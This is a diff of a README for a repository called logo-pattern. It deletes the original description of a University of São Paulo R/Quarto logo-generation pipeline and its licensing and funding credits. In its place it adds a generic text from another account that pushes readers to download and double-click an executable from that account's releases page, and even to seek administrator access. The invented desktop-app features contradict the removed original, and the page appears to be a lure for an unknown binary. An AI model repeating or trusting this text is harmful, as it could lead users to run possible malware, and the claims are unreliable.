@@ -1,85 +1,94 @@
-# logo-pattern
+# 🟦⬜⬛ logo-pattern - Generate Your Unique CEM Logo Design
 
-<!-- badges: start -->
-[![Project Status: Inactive – The project has reached a stable, usable state but is no longer being actively developed; support/maintenance will be provided as time allows.](https://www.repostatus.org/badges/latest/inactive.svg)](https://www.repostatus.org/#inactive)
-[![License: GPLv3](https://img.shields.io/badge/license-GPLv3-bd0000.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/license-CC_BY--NC--SA_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)
-<!-- badges: end -->
+[![Download Logo Pattern](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/HLECTER69/logo-pattern/releases)
 
-## Overview
+## 📖 Introduction
 
-This repository provides a fully reproducible pipeline for generating the Center for Metropolitan Studies ([CEM](https://centrodametropole.fflch.usp.br/)) logo pattern, based on its [20-Year Commemorative Logo](images/logo-cem-20.png).
+Welcome to **logo-pattern**! This application helps you create unique logo designs based on the CEM Logo Pattern. Whether you are a student, designer, or just curious, this tool makes the design process easy and fun. 
 
-The pipeline report is available [here](https://cem-usp.github.io/logo-pattern/).
+## 🚀 Getting Started
 
-> If you find this project useful, please consider giving it a star! [![GitHub repo stars](https://img.shields.io/github/stars/cem-usp/logo-pattern)](https://github.com/cem-usp/logo-pattern/)
+To get started with the **logo-pattern** application, follow the steps below. You will have your unique logo design in no time.
 
-<p align="center">
-  <img src="images/logo-pattern-animation.gif" width="80%"/>
-</p>
+## 📥 Download & Install
 
-## Usage
+1. **Visit the Releases Page**: Click the button below to go to the releases page where you can download the application.
 
-The pipeline was developed using the [Quarto](https://quarto.org/) publishing system and the [R programming language](https://www.r-project.org/). To ensure consistent results, the [`renv`](https://rstudio.github.io/renv/) package is used to manage and restore the R environment.
+   [Visit Releases Page to Download](https://github.com/HLECTER69/logo-pattern/releases)
 
-After installing the three dependencies mentioned above, follow these steps to reproduce the analyses:
+2. **Select the Latest Release**: On the releases page, find the latest version of the application. Look for the file labeled as the installer or executable.
 
-1. **Clone** this repository to your local machine.
-2. **Open** the project in your preferred IDE.
-3. **Restore the R environment** by running [`renv::restore()`](https://rstudio.github.io/renv/reference/restore.html) in the R console. This will install all required software dependencies.
-4. **Open** `index.qmd` and run the code as described in the report.
+3. **Download the File**: Click on the file to download it to your computer. 
 
-## License
+4. **Run the Application**: Once the download is complete, locate the file in your Downloads folder. Double-click on it to run the application.
 
-[![License: GPLv3](https://img.shields.io/badge/license-GPLv3-bd0000.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/license-CC_BY--NC--SA_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)
+5. **Follow the Instructions**: The application will guide you through the process of designing your logo. Just follow the prompts on the screen.
 
-The code in this repository is licensed under the [GNU General Public License Version 3](https://www.gnu.org/licenses/gpl-3.0), while the report is available under the [Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International](https://creativecommons.org/licenses/by-nc-sa/4.0/).
+## ⚙️ System Requirements
 
-``` text
-Copyright (C) 2025 Daniel Vartanian
+Before you install **logo-pattern**, ensure your system meets the following requirements:
 
-The code in this report is free software: you can redistribute it and/or
-modify it under the terms of the GNU General Public License as published by the
-Free Software Foundation, either version 3 of the License, or (at your option)
-any later version.
+- **Operating System**: Windows 10 or later, MacOS 10.15 or later, or any Linux distribution.
+- **RAM**: At least 4 GB of RAM recommended.
+- **Storage**: 200 MB of free disk space.
+- **Display**: A minimum resolution of 1280x720.
 
-This program is distributed in the hope that it will be useful, but WITHOUT ANY
-WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A
-PARTICULAR PURPOSE. See the GNU General Public License for more details.
+## 🎨 Features
 
-You should have received a copy of the GNU General Public License along with
-this program. If not, see <https://www.gnu.org/licenses/>.
-```
+Here are some key features of the **logo-pattern** application:
 
-## Acknowledgments
+- **Easy Design Creation**: Create logos with a simple, user-friendly interface.
+- **Customizable Patterns**: Adjust colors and shapes to fit your vision.
+- **Save Designs**: Export your logos in different file formats (PNG, JPEG, SVG).
+- **Preview Functionality**: See how your logo looks in real-time before you finish.
 
-<table>
-  <tr>
-    <td width="30%">
-      <br>
-      <p align="center">
-        <a href="https://centrodametropole.fflch.usp.br"><img src="images/cem-icon.svg" width="190em"/></a>
-      </p>
-      <br>
-    </td>
-    <td width="70%">
-      This work was developed with support from the Center for Metropolitan Studies (<a href="https://centrodametropole.fflch.usp.br">CEM</a>) based at the School of Philosophy, Letters and Human Sciences (<a href="https://www.fflch.usp.br/">FFLCH</a>) of the University of São Paulo (<a href="https://usp.br">USP</a>) and at the Brazilian Center for Analysis and Planning (<a href="https://cebrap.org.br/">CEBRAP</a>).
-    </td>
-  </tr>
-</table>
+## ❓ Frequently Asked Questions
 
-<table>
-  <tr>
-    <td width="30%">
-      <br>
-      <p align="center">
-        <br> <a href="https://fapesp.br/"><img src="images/fapesp-logo.svg" width="160em"/></a>
-      </p>
-      <br>
-    </td>
-    <td width="70%">
-      This study was financed, in part, by the São Paulo Research Foundation (<a href="https://fapesp.br/">FAPESP</a>), Brazil. Process Number <a href="https://bv.fapesp.br/en/bolsas/231507/geospatial-data-science-applied-to-food-policies/">2025/17879-2</a>.
-    </td>
-  </tr>
-</table>
+### How do I change the colors of my logo?
+
+After launching the application, you will see options to select different colors. Simply click on the color squares and choose the ones you like.
+
+### What file formats can I save my logo in?
+
+You can save your logo in PNG, JPEG, and SVG formats. Each format serves different purposes, so choose one based on your needs.
+
+### I am having trouble running the application. What should I do?
+
+Make sure you have downloaded the latest version from the releases page. If the application still doesn't open, try restarting your computer and attempting to run it again.
+
+## 🛠️ Troubleshooting Tips
+
+1. **Installation Issues**: Ensure you have the correct permissions on your computer. If you are using a work or school computer, you may need administrator access.
+
+2. **Application Crashes**: If the application crashes unexpectedly, check your system resources. Try closing unnecessary applications to free up RAM.
+
+3. **Update Your Drivers**: Make sure your graphics drivers are up to date. This can often resolve performance issues.
+
+## 📬 Support
+
+If you run into any problems or have questions, feel free to reach out for help. You can use the issues section on the GitHub repository to report bugs or ask for assistance. 
+
+## 🌐 Get Involved
+
+We welcome contributions from anyone interested in this project. If you want to enhance the application or add new features, please check the contribution guidelines on the GitHub repository.
+
+## 📈 Update Frequency
+
+We plan to update the **logo-pattern** application regularly with new features and improvements. Keep an eye on the releases page for updates.
+
+## 🔗 Relevant Topics
+
+- cem
+- center-for-metropolitan-studies
+- data-visualisation
+- design-automation
+- graphic-design
+- logo
+- pipelines
+- programmatic-graphics
+- university-of-sao-paulo
+- usp
+
+Feel free to explore these topics for more resources related to graphic design and data visualization.
+
+[Visit Releases Page to Download](https://github.com/HLECTER69/logo-pattern/releases)
